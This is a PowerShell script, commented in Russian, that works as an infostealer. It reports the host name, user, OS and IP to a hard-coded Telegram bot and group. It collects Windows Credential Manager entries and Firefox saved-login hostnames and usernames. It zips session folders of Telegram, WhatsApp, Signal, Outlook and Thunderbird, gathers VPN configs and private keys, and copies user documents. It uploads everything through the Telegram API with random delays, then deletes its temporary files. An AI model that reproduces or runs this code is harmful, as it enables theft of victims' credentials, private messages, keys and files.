# === НАСТРОЙКИ ===
$botToken = "8366406352:AAGExXi9CqgrlIQWESc-uqox-Sml23zkCI0"
$groupId = "-1003805783964"

# ИСПРАВЛЕНИЕ: Добавлены точки к расширениям, так как $_.Extension возвращает ".pdf", а не "pdf"
$ext = @(
    ".doc",".docx",".xls",".xlsx",".ppt",".pptx",
    ".pdf",".txt",".rtf",".odt",".ods",".odp",".csv",
    ".jpg",".jpeg",".png",".gif",".tif",".tiff",".bmp",
    ".zip",".rar",".7z", ".ovpn", ".p12", ".pfx", ".cer", ".key", ".pem"
)

# Пути для поиска документов
$sourcePaths = @(
    "C:\Users\" 
)

# Временная папка для буфера отправки
$tempBufferDir = Join-Path $env:TEMP "TG_Send_Buffer"
if (Test-Path $tempBufferDir) { Remove-Item $tempBufferDir -Recurse -Force }
New-Item -ItemType Directory -Path $tempBufferDir | Out-Null


# === ФУНКЦИЯ РАНДОМНОЙ ЗАДЕРЖКИ ===
function Get-RandomDelay {
    # Генерирует число от 2000 до 4000 мс (2-4 секунды) для большей стабильности
    return (Get-Random -Minimum 2000 -Maximum 4000)
}

# === ФУНКЦИЯ ОТПРАВКИ ===
function Send-And-Delete {
    param([string]$MessageText = "", [string]$FilePath = $null)

    $sentSuccessfully = $false

    if ($FilePath -and (Test-Path -LiteralPath $FilePath)) {
        $uri = "https://api.telegram.org/bot$botToken/sendDocument"
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        try {
            # Используем curl.exe для стабильности
            $result = curl.exe -s -F "chat_id=$groupId" -F "caption=$MessageText" -F "document=@$FilePath" $uri
            if ($LASTEXITCODE -eq 0) {
                Write-Host "Sent & Deleted: $fileName" -ForegroundColor Green
                $sentSuccessfully = $true
                Remove-Item -LiteralPath $FilePath -Force -ErrorAction SilentlyContinue
            } else {
                Write-Host "Failed to send (curl error): $fileName" -ForegroundColor Red
            }
        } catch { 
            Write-Host "Critical error sending file: $_" -ForegroundColor Red 
        }
    }
    elseif (-not $FilePath -and $MessageText) {
        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
        $body = @{ chat_id = $groupId; text = $MessageText; parse_mode = "Markdown" }
        try {
            Invoke-RestMethod -Uri $uri -Method Post -Body $body | Out-Null
            Write-Host "Sent Msg: $($MessageText.Substring(0, [Math]::Min(50, $MessageText.Length)))..." -ForegroundColor Cyan
            $sentSuccessfully = $true
        } catch { 
            Write-Host "Msg Error: $_" -ForegroundColor Red 
        }
    }

    # === ЗАДЕРЖКА ПРИМЕНЯЕТСЯ КО ВСЕМ ОТПРАВКАМ (и файлам, и сообщениям) ===
    if ($sentSuccessfully) {
        $delay = Get-RandomDelay
        Write-Host "Waiting $delay ms before next action..." -ForegroundColor DarkGray
        Start-Sleep -Milliseconds $delay
    }
}


# === ФУНКЦИЯ ИНФО О ПК ===
function Get-PCInfo {
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $pcName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like "1*" -or $_.IPAddress -like "10*" -or $_.IPAddress -like "192.*" } | Select-Object -First 1 -ExpandProperty IPAddress)
    } catch { $ip = "N/A" }
    if (-not $ip) { $ip = "N/A" }
    return "*PC Info:*$`n`n- Host: $($pcName)`n- User: $($userName)`n- OS: $($os)`n- IP: $($ip)"
}

# ============ ЭТАП 0: СТАРТ ============
Write-Host "Starting Script..." -ForegroundColor Cyan
$pcInfo = Get-PCInfo
Send-And-Delete -MessageText "*START*$`n`n$pcInfo$`n`n*Collecting data...*"


# === ФУНКЦИЯ РАНДОМНОЙ ЗАДЕРЖКИ ===
function Get-RandomDelay {
    # Генерирует число от 1000 до 2500 мс (1-2.5 секунды)
    return (Get-Random -Minimum 1000 -Maximum 2500)
}

# ==========================================
# ЭТАП 0: СТАРТ
# ==========================================
Write-Host "Starting Script..." -ForegroundColor Cyan
$pcInfo = Get-PCInfo
Send-And-Delete -MessageText "*START*$`n`n$pcInfo$`n`n*Collecting data. ..*"

# ==========================================
# ЭТАП 1: Сбор логинов (текстовый дамп)
# ==========================================
Write-Host "1. Collecting credentials..." -ForegroundColor Cyan
$credsData = @()

# 1.1 Windows Credential Manager
try {
    $cmdOutput = cmd /c "cmdkey /list"
    $currentTarget = ""
    foreach ($line in $cmdOutput) {
        if ($line -match "Target:") { $currentTarget = $line.Split(':')[1].Trim() }
        if ($line -match "User:") {
            $user = $line.Split(':')[1].Trim()
            $credsData += "$currentTarget | $user"
        }
    }
} catch {}

# 1.2 Firefox logins.json (упрощенный поиск)
$firefoxPaths = Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
foreach ($profileDir in $firefoxPaths) {
    $jsonFile = Join-Path $profileDir.FullName "logins.json"
    if (Test-Path $jsonFile) {
        try {
            $json = Get-Content $jsonFile -Raw | ConvertFrom-Json
            if ($json.logins) {
                foreach ($login in $json.logins) {
                    $credsData += "Firefox | $($login.hostname) | $($login.username)"
                }
            }
        } catch {}
    }
}

# Сохраняем в файл во временную папку и отправляем
$credsFile = Join-Path $tempBufferDir "credentials_dump.txt"
if ($credsData.Count -gt 0) {
    $credsData | Out-File -FilePath $credsFile -Encoding UTF8
    Send-And-Delete -MessageText "*Credentials Dump:*" -FilePath $credsFile
} else {
    Send-And-Delete -MessageText "*No credentials found (basic scan).*"
}

# ==========================================
# ЭТАП 2: Мессенджеры (Сессии)
# ==========================================
Write-Host "2. Collecting messenger sessions..." -ForegroundColor Cyan

$messengerPatterns = @(
    "AppData\Roaming\Telegram Desktop\tdata",
    "AppData\Roaming\WhatsApp",
    "AppData\Local\WhatsApp",
    "AppData\Roaming\Signal",
    "AppData\Roaming\Microsoft\Outlook",
    "AppData\Roaming\Thunderbird\Profiles"
)

foreach ($pattern in $messengerPatterns) {
    $fullPattern = "C:\Users\*\$pattern"
    $dirs = Get-ChildItem -Path $fullPattern -Directory -ErrorAction SilentlyContinue

    foreach ($dir in $dirs) {
        $baseName = Split-Path $dir.FullName -Leaf
        # Имя архива: Session_ИмяПапки.zip
        $zipName = Join-Path $tempBufferDir "Session_${baseName}_${env:USERNAME}.zip"
        
        try {
            Compress-Archive -Path $dir.FullName -DestinationPath $zipName -Force
            Send-And-Delete -MessageText "*Session Archive:* $baseName" -FilePath $zipName
        } catch { 
            Write-Host "Error zipping ${baseName}: $_" -ForegroundColor Red 
        }
    }
}

# ==========================================
# ЭТАП 3: Конфиги (ovpn, keys, p12...)
# ==========================================
Write-Host "3. Collecting configs (keys, ovpn)..." -ForegroundColor Cyan

$configPatterns = @("*.ovpn", "*.p12", "*.pfx", "*.cer", "*.key", "*.pem")
$searchRoots = @("C:\Users", "C:\Program Files", "C:\ProgramData")

foreach ($root in $searchRoots) {
    if (Test-Path $root) {
        foreach ($pattern in $configPatterns) {
            $files = Get-ChildItem -Path $root -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue
            
            foreach ($file in $files) {
                $originalName = $file.Name
                $tempFile = Join-Path $tempBufferDir $originalName
                
                # Защита от коллизий имен в буфере
                $counter = 1
                while (Test-Path $tempFile) {
                    $nameParts = $originalName.Split('.')
                    $extPart = $nameParts[-1]
                    $namePart = $nameParts[0..($nameParts.Length-2)] -join '.'
                    $originalName = "${namePart}_${counter}.${extPart}"
                    $tempFile = Join-Path $tempBufferDir $originalName
                    $counter++
                }

                try {
                    Copy-Item -Path $file.FullName -Destination $tempFile -Force
                    Send-And-Delete -MessageText "*Config Found:* $($file.Name)`nPath: $($file.DirectoryName)" -FilePath $tempFile
                } catch {
                    Write-Host "Error copying config $($file.Name): $_" -ForegroundColor Red
                }
            }
        }
    }
}
# ============ ЭТАП 4: Поиск документов ============
Write-Host "4. Scanning for documents..." -ForegroundColor Cyan

$docBufferDir = Join-Path $tempBufferDir "Docs"
New-Item -ItemType Directory -Path $docBufferDir -Force | Out-Null
$sentFilesHash = @{}

foreach ($srcPath in $sourcePaths) {
    Write-Host "Checking path: $srcPath" -ForegroundColor Gray

    if (-not (Test-Path $srcPath)) {
        Write-Host "Path NOT FOUND: $srcPath" -ForegroundColor Red
        continue
    }

    Write-Host "Scanning: $srcPath" -ForegroundColor Green

    try {
        # Ищем все файлы
        $allFiles = Get-ChildItem -Path $srcPath -Recurse -File -Force -ErrorAction SilentlyContinue

        # Фильтруем по расширениям (теперь с точками, как возвращает PowerShell)
        $files = $allFiles | Where-Object { $_.Extension.ToLower() -in $ext }

        if ($files.Count -eq 0) {
            Write-Host "No files found in $srcPath matching extensions." -ForegroundColor Yellow
            continue
        }

        Write-Host "Found $($files.Count) potential files." -ForegroundColor Gray

        foreach ($file in $files) {
            if ($sentFilesHash.ContainsKey($file.FullName)) { continue }

            if ($file.Length -gt 50MB) {
                Write-Host "Skipped (too large >50MB): $($file.Name)" -ForegroundColor Yellow
                $sentFilesHash[$file.FullName] = $true
                continue
            }

            $originalName = $file.Name
            $tempFile = Join-Path $docBufferDir $originalName

            # Уникализация имени
            $counter = 1
            while (Test-Path $tempFile) {
                $nameParts = $originalName.Split('.')
                if ($nameParts.Count -gt 1) {
                    $extPart = $nameParts[-1]
                    $namePart = $nameParts[0..($nameParts.Length-2)] -join '.'
                    $originalName = "${namePart}_${counter}.${extPart}"
                } else {
                    $originalName = "${originalName}_${counter}"
                }
                $tempFile = Join-Path $docBufferDir $originalName
                $counter++
            }

            try {
                Copy-Item -Path $file.FullName -Destination $tempFile -Force
                Write-Host "Copied to buffer: $($file.Name)" -ForegroundColor DarkGreen
                $sentFilesHash[$file.FullName] = $true
            } catch {
                Write-Host "Error copying $($file.Name): $_" -ForegroundColor Red
            }
        }
    } catch {
        Write-Host "Error processing path ${srcPath}: $_" -ForegroundColor Red
    }
}


# --- ЭТАП 4.2: Отправка из буфера ---
Write-Host "4.2 Sending buffered documents to Telegram..." -ForegroundColor Cyan

$bufferedFiles = Get-ChildItem -Path $docBufferDir -File -ErrorAction SilentlyContinue

if ($bufferedFiles.Count -eq 0) {
    Write-Host "Buffer is empty. Nothing to send." -ForegroundColor Yellow
} else {
    foreach ($bufFile in $bufferedFiles) {
        # Проверка: файл должен иметь имя и расширение
        if ([string]::IsNullOrWhiteSpace($bufFile.Name)) {
            Write-Host "Skipped empty name file: $($bufFile.FullName)" -ForegroundColor Yellow
            continue
        }

        try {
            # Вызов функции с задержкой
            Send-And-Delete -MessageText "*Document:* $($bufFile.Name)" -FilePath $bufFile.FullName
        } 
        catch {
            Write-Host "Error sending $($bufFile.Name): $_" -ForegroundColor Red
            # Даже если ошибка, делаем небольшую паузу перед следующим файлом, чтобы не спамить
            Start-Sleep -Milliseconds 1500
        }
    }
}

# ============ ЭТАП 5: Очистка ============
Write-Host "Cleaning up temp folder..." -ForegroundColor Cyan
if (Test-Path $tempBufferDir) {
    Remove-Item $tempBufferDir -Recurse -Force -ErrorAction SilentlyContinue
}

Send-And-Delete -MessageText "*FINISHED*$`n`n$pcInfo"
Write-Host "Script completed." -ForegroundColor Green
